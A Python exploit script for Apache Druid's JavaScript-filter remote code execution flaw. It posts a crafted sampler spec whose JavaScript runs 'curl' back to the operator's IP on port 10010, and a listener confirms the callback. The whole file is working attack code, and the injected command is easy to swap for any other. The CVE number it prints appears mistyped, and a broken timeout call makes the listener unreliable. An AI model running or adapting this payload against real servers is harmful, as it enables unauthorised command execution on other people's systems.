#encoding:utf-8
try:
    import requests,os,sys,logging,socket,threading
    logging.basicConfig(level=logging.INFO,format="%(message)s")
except Exception as e:
    logging.info("[*] {}".format(e))
    os._exit(6)


def get_my_ip(ip,port):
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((ip,int(port)))
        my_ip = s.getsockname()
        s.close()
        return(my_ip[0])
    except Exception as e:
        os._exit(4)
def listen(ip):
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.bind(("0.0.0.0",10010))
        s.listen(1)
        s.timeout(3)
        while True:
            sock,addr = s.accept()
            if sock :
                user =  sock.recv(4096).strip()
                logging.info("[+] {} find cve-2021-25464 ".format(ip))
                os._exit(1)
    except Exception as e:
        logging.info("[-] {} do not found cve-2021-25464".format(ip))
        os._exit(2)



def check(ip,port,my_ip):
    target = "http://" + ip + ":" + port
    payload = "/druid/indexer/v1/sampler?for=filter"                                   #填写payload
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/json;charset=utf-8',
        'Origin': '{}'.format(target),
        'Referer': '{}/unified-console.html'.format(target),
    }                                                               #填写header头
    data = '''{\"type\":\"index\",\"spec\":{\"type\":\"index\",\"ioConfig\":{\"type\":\"index\",\"firehose\":{\"type\":\"local\",\"baseDir\":\"/opt/\",\"filter\":\"\"}},\"dataSchema\":{\"dataSource\":\"sample\",\"parser\":{\"type\":\"string\",\"parseSpec\":{\"format\":\"json\",\"timestampSpec\":{\"column\":\"time\",\"format\":\"iso\"},\"dimensionsSpec\":{}}},\"transformSpec\":{\"transforms\":[],\"filter\":{\"type\":\"javascript\",
\"function\":\"function(value){return java.lang.Runtime.getRuntime().exec('curl ''' + my_ip  +''':10010')}\",
\"dimension\":\"added\",
\"\":{
\"enabled\":\"true\"
}
}}}},\"samplerConfig\":{\"numRows\":500,\"timeoutMs\":15000}}'''
    try:
        req = requests.post(url=target+payload,headers=header,data=data,timeout=15,verify=False)

    except Exception as e:
        logging.info("[*] {}".format(e))
        os._exit(4)


def main(ip,port):
    # my_ip = "770e32b3.dns.bypass.eu.org."
    my_ip = get_my_ip(ip,port)
    listening = threading.Thread(target=listen,args=(ip,))
    listening.start()

    check(ip,port,my_ip)


if __name__== "__main__":
    ip = sys.argv[1]
    port = sys.argv[2]
    main(ip,port)